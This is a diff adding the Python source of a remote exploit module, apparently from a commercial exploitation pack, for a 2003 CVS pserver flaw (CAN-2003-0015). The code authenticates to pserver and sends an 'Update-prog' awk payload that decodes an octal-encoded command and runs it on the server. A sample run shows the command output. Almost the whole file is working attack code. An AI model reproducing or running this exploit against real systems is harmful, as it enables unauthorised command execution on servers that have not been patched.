@@ -1,0 +1,291 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007
+#
+
+import sys, struct
+
+sys.path.append(".")
+sys.path.append("../../")
+
+import os
+import getopt
+import socket
+import time
+import string
+
+DOCUMENTATION={}
+DOCUMENTATION["Date public"] = "2003.01.20"
+DOCUMENTATION["CVE Name"] = "CAN-2003-0015"
+DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CAN-2003-0015"
+DOCUMENTATION["VersionsAffected"] = "Versions <= 1.11.4"
+DESCRIPTION = "CVS pserverd arbitrary command remote execution"
+
+NOTE = """
+Tested on Linux !
+
+$ ./3rdparty/D2SEC/exploits/pserverd2/pserverd2.py -t localhost -u cvs -z foo -r /home/compaq/tmp/cvs -c "/usr/bin/id"
+[C] (127.0.0.1/32) Attacking 127.0.0.1:2401
+[C] (127.0.0.1/32) Login to cvs pserver.
+[C] (127.0.0.1/32) Sending command:
+Root /home/compaq/tmp/cvs
+Directory logs
+/home/compaq/tmp/cvs
+Update-prog awk BEGIN{y="";z="057165163162057142151156057151144";for(i=1;i<length(z);i+=3){x=sprintf("%s%c",y,int(substr(z,i,1)*64+substr(z,i+1,1)*8+substr(z,i+2,1)));y=x};system(y);exit(0)} --
+update
+
+[C] (127.0.0.1/32) Receiving CVS server answer!
+M uid=1002(cvsuser) gid=1001(cvsuser) groups=1001(cvsuser)
+E cvs server: Updating .
+M cvs server: Executing ''awk' 'BEGIN{y="";z="057165163162057142151156057151144";for(i=1;i<length(z);i+=3){x=sprintf("%s%c",y,int(substr(z,i,1)*64+substr(z,i+1,1)*8+substr(z,i+2,1)));y=x};system(y);exit(0)}' '--' '/home/compaq/tmp/cvs''
+ok
+"""
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Exploit"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Linux"], ["Windows"], ["Solaris"], ["AIX"], ["FreeBSD"], ["MacOSX"], ["HP-UX"] ]
+PROPERTY['NOTES'] = NOTE
+
+NAME = "CVS pserverd arbitrary command remote execution"
+VERSION ="1.0"
+
+from MOSDEF import mosdef
+from tcpexploit import tcpexploit
+from exploitutils import *
+
+cmdline = 0
+    
+# From cvs source
+class cvserror(Exception):
+	def __init__(self, value):
+		self.value = value
+                
+	def __str__(self):
+		return repr(self.value)
+
+class cvslib:
+	shift= [
+		0,  1,  2,  3,  4,  5,  6,  7,  8,  9, 10, 11, 12, 13, 14, 15,
+		16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31,
+		114,120, 53, 79, 96,109, 72,108, 70, 64, 76, 67,116, 74, 68, 87,
+		111, 52, 75,119, 49, 34, 82, 81, 95, 65,112, 86,118,110,122,105,
+		41, 57, 83, 43, 46,102, 40, 89, 38,103, 45, 50, 42,123, 91, 35,
+		125, 55, 54, 66,124,126, 59, 47, 92, 71,115, 78, 88,107,106, 56,
+		36,121,117,104,101,100, 69, 73, 99, 63, 94, 93, 39, 37, 61, 48,
+		58,113, 32, 90, 44, 98, 60, 51, 33, 97, 62, 77, 84, 80, 85,223,
+		225,216,187,166,229,189,222,188,141,249,148,200,184,136,248,190,
+		199,170,181,204,138,232,218,183,255,234,220,247,213,203,226,193,
+		174,172,228,252,217,201,131,230,197,211,145,238,161,179,160,212,
+		207,221,254,173,202,146,224,151,140,196,205,130,135,133,143,246,
+		192,159,244,239,185,168,215,144,139,165,180,157,147,186,214,176,
+		227,231,219,169,175,156,206,198,129,164,150,210,154,177,134,127,
+		182,128,158,208,162,132,167,209,149,241,153,251,237,236,171,195,
+		243,233,253,240,194,250,191,155,142,137,245,235,163,242,178,152
+	]
+
+	def __init__(self, ip="", port="", socket=None):
+		self.host = ip
+		self.port = port
+		self.s = socket
+		self.response = ""
+
+	def cvs_login(self, user, passwd, cvs):
+		host = self.host
+		port= self.port
+		
+		self.s.connect((host, port))
+
+		login_req = "BEGIN AUTH REQUEST\n" 
+		login_req += cvs + "\n"
+		login_req += user + "\n"
+		login_req += self.scramble(passwd) + "\n"
+		login_req += "END AUTH REQUEST\n"
+        
+		self.s.send(login_req)
+
+		resp = self.s.recv(200)    
+		if resp != "I LOVE YOU\n":
+			d = resp.find("\n")
+			raise cvserror("cvs authentication: %s" % resp[:d])
+
+	# from cvs spec (http://www.elegosoft.com/cvs/cvsclient.html)
+	# "This is only to prevent inadvertent compromise; it provides no protection 
+	#  against even a relatively unsophisticated attacker."
+	def scramble(self, passwd):
+		ultraencrypted = ""
+			
+		for a in range(0, len(passwd)):
+			ultraencrypted += chr(self.shift[ ord(passwd[a])])
+
+		return "A" + ultraencrypted
+
+	# sendcommand set self.response with the response buffer
+	def sendcommand(self, command): # add a \n at the end of the command
+		self.s.send(command)
+		self.response = ""
+
+		while 1:
+			tmp = self.s.recv(16000)
+			if not tmp:
+				raise cvserror("[-] didn't receive any data")
+			self.response += tmp
+			if tmp.find("ok") > -1:
+				return "ok"
+			if tmp.find("error\n") > -1:
+				raise cvserror("cvs protocol error: %s" % tmp)
+       
+	def getresponse(self):
+		return self.response
+
+	def close(self):
+		self.s.close()
+
+class CVSpserverdLinux(tcpexploit):
+    def __init__(self): 
+			pass
+
+    def encode_string(self, string):
+      encoded = ""
+
+      for s in string:
+         i = ord(s)
+         x = oct(i)
+         if len(x) > 3:
+           x = x[1:]
+         encoded += x
+
+      return encoded
+			
+                
+    def dorun(self):
+			host = self.target.interface
+			port = self.argsDict["port"]
+			user = self.argsDict["user"]
+			password = self.argsDict["password"]
+			repository = self.argsDict["repository"]
+			command = self.argsDict["command"]
+			encoded_command = ""
+
+			self.setInfo("%s attacking %s:%d (in progress)" % (NAME, host, port))
+			self.log("Attacking %s:%d"%(host,port))
+
+			c = cvslib(host, port, self.gettcpsock())
+
+			try:
+				self.log("Login to cvs pserver.")
+				c.cvs_login(user, password, repository)
+			except cvserror, msg:
+				self.setInfo("%s attacking %s:%d (failed)" % (NAME, host, port))
+				self.log("CVS pserverd failed: %s" % str(msg))
+				return 0   
+           
+			encoded_command = self.encode_string(command)
+
+			buf = "Root %s\n" % repository
+			buf += "Directory logs\n"
+			buf += repository + "\n"
+			buf += "Update-prog awk BEGIN{y=\"\";z=\"" + encoded_command + "\";for(i=1;i<length(z);i+=3){x=sprintf(\"%s%c\",y,int(substr(z,i,1)*64+substr(z,i+1,1)*8+substr(z,i+2,1)));y=x};system(y);exit(0)} --\n"
+			buf += "update\n"
+			
+			self.log("Sending command:\n%s" % buf);
+
+			c.sendcommand(buf)
+
+			self.log("Receiving CVS server answer!")
+
+			tmp = c.getresponse()
+
+			self.log(tmp)
+
+			c.close()
+
+			self.log("Exploit succeeded!")
+			self.setInfo("%s attacked %s:%d (succeeded!)" % (NAME, host, port))
+
+			return 1
+
+class theexploit(CVSpserverdLinux):
+    def __init__(self):
+        tcpexploit.__init__(self)
+        self.setPort(2401)
+        self.setHost("")
+        self.repository = "/usr/local/cvsroot"
+        self.username = "anoncvs"
+        self.password = ""
+        self.name = NAME
+
+        return 
+
+    def run(self):
+				CVSpserverdLinux.__init__(self)
+				shell=self.dorun()
+
+def usage(app):
+    print "Usage: " + sys.argv[0] + " -t target -u username -z password -r cvs_repository -c command"
+    print "Example: ./3rdparty/D2SEC/exploits/pserverd/pserverd.py -t TARGETHOST -u anoncvs -z anoncvs -r /usr/local/cvsroot -c /usr/bin/id"
+    sys.exit()   
+        
+if __name__ == '__main__':
+	app = theexploit()
+	cmdline = 1
+	try:
+		(opts,args) = getopt.getopt(sys.argv[1:],"t:p:u:z:c:r:")
+	except getopt.GetoptError:
+		usage(app)
+
+	host = ""
+	targetport = 2401
+	repository = "/usr/local/cvsroot"
+	username = "anoncvs"
+	password = ""
+	command = ""
+	i = 0
+
+	for o,a in opts:
+		if o in ["-t"]:
+			i+=1
+			host=a
+		if o in ["-p"]:
+			i+=1
+			targetport=a
+		if o in ["-u"]:
+			i+=1
+			username=a
+		if o in ["-z"]:
+			i+=1
+			password=a
+		if o in ["-r"]:
+			i+=1
+			repository=a
+		if o in ["-c"]:
+			i+=1
+			command = a
+
+	if i<2:
+		usage(app)
+	
+	if len(command) == 0:
+		usage(app)
+	
+	from hostKnowledge import *
+	from listenerLine import *
+	from localNode import *
+
+	app.target=hostKnowledge(host,None)
+	argsDict={}
+	argsDict["port"] = int(targetport)
+	argsDict["repository"] = repository 
+	argsDict["user"] = username
+	argsDict["password"] = password
+	argsDict["command"] = command
+	argsDict["passednodes"] = [localNode()]
+
+	app.cmdline = 1
+
+	app.argsDict = argsDict
+	app.run()
